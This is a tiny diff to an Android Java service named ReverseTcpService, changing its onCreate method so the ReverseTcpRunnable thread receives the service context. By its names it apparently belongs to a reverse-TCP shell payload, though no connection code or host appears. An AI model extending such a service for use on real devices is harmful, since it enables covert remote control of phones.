@@ -26,7 +26,7 @@ public class ReverseTcpService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        Thread thread = new Thread(new ReverseTcpRunnable());
+        Thread thread = new Thread(new ReverseTcpRunnable(this));
         thread.start();
     }
 
